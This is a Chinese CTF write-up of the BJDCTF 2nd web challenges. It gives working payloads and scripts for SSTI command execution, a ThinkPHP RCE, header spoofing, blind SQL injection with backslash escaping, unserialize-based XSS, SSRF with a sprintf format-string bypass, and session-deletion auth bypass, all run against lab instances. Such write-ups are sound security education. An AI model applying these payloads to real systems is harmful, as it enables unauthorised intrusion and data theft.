---
title: BJDCTF-2nd WEB
date: 2020-06-11 10:08:10
tags: CTF WEB
categories: CTF做题记录
---

<!-- TOC -->

- [[BJDCTF 2nd]fake google](#bjdctf-2ndfake-google)
- [[BJDCTF 2nd]old-hack](#bjdctf-2ndold-hack)
- [[BJDCTF 2nd]假猪套天下第一](#bjdctf-2nd假猪套天下第一)
- [[BJDCTF 2nd]简单注入](#bjdctf-2nd简单注入)
- [[BJDCTF 2nd]xss之光](#bjdctf-2ndxss之光)
- [[BJDCTF 2nd]Schrödinger](#bjdctf-2ndschrödinger)
- [[BJDCTF 2nd]elementmaster](#bjdctf-2ndelementmaster)
- [[BJDCTF 2nd]文件探测](#bjdctf-2nd文件探测)

<!-- /TOC -->

<!--more-->
---
# [BJDCTF 2nd]fake google
> ssti

打开复现地址是一个Google页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611075142860.png)
随便搜索一下看了源码提示ssti
>SSTI又叫服务端模板注入攻击
>推荐先知师傅的一篇入门教程：https://xz.aliyun.com/t/3679

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611075232196.png)
那就试试ssti能不能用吧，`?name={{1-1}}`下面输出却是0，说明注入是可以的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611075751716.png)
列出基类，`?name={{"".__class__.__base__}}`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611080032266.png)
列出其子类，`?name={{"".__class__.__base__.__subclasses__()}}`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611080133962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
有这么多，我们需要查找到有==os==类的子类，可以看到确实有一个这样的类，现在就是找到他的下标，肯定不会一个一个数鸭哈哈，写个脚本（当然也能用bp爆破），在上一条payload的后面加上`[]`就行，就像是找数组里面的值（`?name={{"".__class__.__base__.__subclasses__()[110]}}`）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611080619702.png)
```python
import requests
import time

for i in range(0,200):
	time.sleep(0.06)//赵师傅靶机有访问频率限制，所以加上sleep
	url = 'http://6b31caef-86aa-49f5-b819-14ec6d3637e6.node3.buuoj.cn/qaq?name={{"".__class__.__base__.__subclasses__()[%s]}}'% i
	#print(url)
	res = requests.get(url)
	if 'os._wrap_close' in res.text:
		print(url)
		break
```
运行后得到os类在117位，然后初始化此类（`?name={{"".__class__.__base__.__subclasses__()[117].__init__.__globals__}}`），用pepon执行命令，可以看到flag在根目录下，cat一下就出来了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611082102973.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611082144159.png)

---
# [BJDCTF 2nd]old-hack

> RCE的利用

开了靶机，黑客既视感
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611082246944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
上面的THINKPHP5是一个php框架，用参数s引入一个不存在的模块爆出版本信息，然后去搜搜有没有漏洞hhh
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611084056466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
直接搜5.0.23的RCE,flag在根目录下，cat一下就好
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611084228995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# [BJDCTF 2nd]假猪套天下第一
> HTTP Header基础知识考察
> 这道题是Y1ng大师傅出的题，考的很基础
> Y1ng师傅出题笔记：https://www.gem-love.com/ctf/2056.html#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80
> Y1ng推荐的HTTP Header 详解：https://www.cnblogs.com/jxl1996/p/10245958.html

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611084438687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
admin弱口令登陆发现，但是用其他的账户随便输都能进去，进去后啥也没有，抓包看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611084653455.png)
302跳转！，进去注释给的页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611085307456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611085415184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
没发现啥有用的，在抓包看看，cookie里面有个time参数，根据页面提示把他改到99年以后，又说我们不是来自本地的用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611085605328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
用xff修改后（X-Forwarded-For:127.0.0.1直接加到repeater最下面就好），说我Too young too simple，那就换种方式，用Client-IP或者X-Real-IP；
然后提示访问要来自gem-love.com，用Referer:gem-love.com;
接着提示我们的浏览器不是Commodo 64，至于Commodo 64是什么自行搜索，然后用Commodore 64把UA头改了就行；
然后说邮箱不对，加上From:root@gem-love.com;
最后提示代理服务器需要是y1ng.vip，或者你可以py100一月hhh，加上via:y1ng.vip;
大功告成，解一下base64就好了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611091429240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# [BJDCTF 2nd]简单注入
>py脚本练习

这题很显然，~~P3rh4ps needs a girl friend~~，简单试了试，有waf，fuzz一下
![fuzz](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.12nigwedkf8c.png)
主要的过滤：单双引号、union、select、等号、LIKE
![dirsearch](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.wlqaadkk3w.png)
扫到一个`robots.txt`，进去有hint，给了sql语句`select * from users where username='$_POST["username"]' and password='$_POST["password"]';`\
~~菜鸡莫得思路，还是老样子，看wp。。。~~这题原来没用过滤`\`这样就可以在username那里将单引号转移出来，pass那里再用数字型注入即可，例如这样
![eg](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.kptn0bt4q4.png)
此时的sql语句为`select * from users where username='admin\' and password='or(1)#';`中间的`and password=`成了username的一部分，达到目的，上盲注脚本，爆破账号密码
```python
import requests

url = '''http://7d0a5972-b07c-4a10-9181-ec2eea8d0e8a.node3.buuoj.cn'''
data = {"username":"admin\\","password":""}
passwd = ""
i=0

print("--------Start--------")
while True:
	i += 1
	rigth = 127
	left = 32

	while (left < rigth):
		mid = (left + rigth) // 2
		payload = "or/**/if(ascii(substr(password,%d,1))>%d,1,0)#"%(i,mid)
		data["password"] = payload
		resp = requests.post(url,data=data)
		if "stronger" in resp.text:
			left = mid + 1
		else:
			rigth = mid

	if(chr(mid) == " "):
		break
	passwd += chr(left)
	print(passwd)
```
![password](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.mv24yr7umek.png)
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.3n2fwg8yyko.png)

---
# [BJDCTF 2nd]xss之光
>git泄露，对php原生类的序列化，xss

页面没啥东西，扫了一下发现有git泄露
![.git/](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.7yqscqrfn62.png)
下载源码就是个简单的反序列化，但是也太简单了，只有这些
```php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```
我对谁去反序列化?对自己吗？还真是。。。[参考文章](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html)\
用`Exception`原生类进行反序列化xss
```php
<?php
$a = new Exception("<script>alert(1)</script>");
echo urlencode(serialize($a));
?>
```
![xss1](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.0uwdmjdthhma.png)
可以弹窗，随便跳转一个，在响应头可以看到flag
```php
<?php
$a = new Exception("<script src='www.baidu.com'></script>");
echo urlencode(serialize($a));
?>
```
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.lp2i37uhq1.png)

---
# [BJDCTF 2nd]Schrödinger
>出题人的迷惑行为

一堆嘤语，看也看不懂。。。源码还是可以看看的，有hint，提示删除`test.php`
![hint](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.e6g75pxb8ef.png)
进了test.php让登陆，说在admin账户留下了好东西，怎么都登不上，也不能注入。脑洞题：参考[Y1ng](https://www.gem-love.com/ctf/2097.html#Schrodinger)，把这个页面放到主页去跑密码，不得用，啥也跑不出来，抓包看看，响应包设置了cookie
![response](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.u37uz1yhy3i.png)
base64解码发现是个时间戳，置空，弹出av号，去B站评论区翻翻就有了

---
# [BJDCTF 2nd]elementmaster
>脑洞，py脚本练习

是个漫画，画的真好，就是嘤语看不懂，只能嘤嘤嘤\
看了源码，图片的命名似曾相识，搜一下，竟然是周期表老豆~~罪过罪过，竟然不认识英文名~~
![mendeleev](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.sk0uoc8cwcg.png)
源码p标签的id看着也奇怪，十六进制转字符串，是`Po.`，结合门捷列夫，难道是元素周期表？访问一下Po.php发现是个点，再试试H.php，404了，写个py遍历去吧
```python
import requests

elements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar','K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr','Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')

print("--------Start--------")
for x in elements:
	url = 'http://faa41753-cc3c-4786-b6b1-948d6b99d1bb.node3.buuoj.cn/'+x+'.php'
	r = requests.get(url)
	if r.status_code == 200:
		print(r.text,end = '')
	else:
		continue
```
结果是`And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php`，进去就能得到flag

---
# [BJDCTF 2nd]文件探测
>php伪协议，SSRF，session绕过
>[PHP trick](https://www.jianshu.com/p/9c031dee57b7)

~~界面很好玩，玩了一会~~源码有这两句
```
<!-- Inheriting and carrying forward the traditional culture of the first BJDCTF, I left a hint in some place that you may neglect  -->
<!-- If you have no idea about the culture of the 1st BJDCTF, you may go to check out the 1st BJDCTF's wirteup that can be found in my blog -->
```
没做过第一届的BJD，不过扫目录倒是扫到不少东西
![dirsearch](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.itjv65cnspq.png)
也就home.php用处大点，admin.php未知，访问`home.php`后，URL变成了`/home.php?file=system`应该可以读源码吧，试一试`?file=php://filter/convert.base64-encode/resource=home.php`最后被拼上一个`.fxxkyou!`，把`php`去掉，正常读源码
```php
//home.php
<?php

setcookie("y1ng", sha1(md5('y1ng')), time() + 3600);
setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);

if(isset($_GET['file'])){
    if (preg_match("/\^|\~|&|\|/", $_GET['file'])) {
        die("forbidden");
    }

    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
        die("not now!");
    }

    if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file'])){
        die("You! are! not! my! admin!");
    }

    if(preg_match("/^home$/i", $_GET['file'])){
        die("禁止套娃");
    }

    else{
        if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file'])){
            $file = $_GET['file'].".php";
        }
        else{
            $file = $_GET['file'].".fxxkyou!";
        }
        echo "现在访问的是 ".$file . "<br>";
        require $file;
    }
} else {
    echo "<script>location.href='./home.php?file=system'</script>";
}
```
不能读flag.php和admin.php不过system.php可以读源码
```php
//system.php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">你知道目录下都有什么文件吗?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">请输入你想检测文件内容长度的url</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">你希望以何种方式访问？GET？POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">提交</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@颖奇L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
}

?>
```

- 输入的url必须是以`http://127.0.0.1/`开头的不能有flag字样，而且最后会被加上`.y1ng.txt`\

- 访问模式为GET或POST，但在匹配时未判断结尾

- 输出时，先file_get_contents，在print，但是输出为%d，并不能直接读源码

SSRF！提示的页面还有个admin.php没用，在直接访问的时候也提示只有local host才能访问，正好可以读取，但是怎么读取？URL末尾被拼接`.y1ng.txt`，输出也是`%d`，无从下手，参考wp发现，第一个问题只需要加上一个参数`a=xxx`或`#`（锚点）让其失效即可绕过，payload：`http://127.0.0.1/admin.php#`\
如果是%d来输出页面，就会将源码以二进制输出，并不是我们想要的，在匹配访问模式时并未匹配结尾，这就可以在`q3`参数上下点手脚，[这篇博客](https://www.cnblogs.com/yesec/p/12554957.html)给出两种办法绕过

- 1、`%1$s`：[原理](https://www.php.net/manual/en/function.sprintf.php)是`%1$s`会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码\
```print(sprintf("$url method&content_size:"GET%1$s%d", $detect));  // %1$s会以字符串格式输出$detect，而%d会输出0```

- 2、 %s%  ——  这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：\
```print(sprintf("$url method&content_size:"GET%s%%d", $detect));  // %d前的%被转义，因此失效```

完整payload：`q1=1&q2=http://127.0.0.1/admin.php#&q3=GET%1$s `，得到admin.php源码：
```php
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}
?>
```
这次的`mt_rand`是真随机，不能爆破。但是只要我们传入`decrypt`参数就可以不产生随机数。第36行，只要传入的和session加密后的值相同即可输出flag，如果我把session删了呢？那不就只需要知道AES的密文就可以得到falg了吗，先算一下密文
```php
<?php
function aesEn($data, $key){
    $method = 'AES-128-CBC';
    $iv = md5('174.0.0.15',true);//先访问一下admin.php得到自己的ip
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}
echo(aesEn('','y1ng'));
?>
```
结果为`rs6fba9t/mQQ1ydsyw4c1Q==`，然后del掉session即可
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF-2nd/image.pynapdorpzg.png)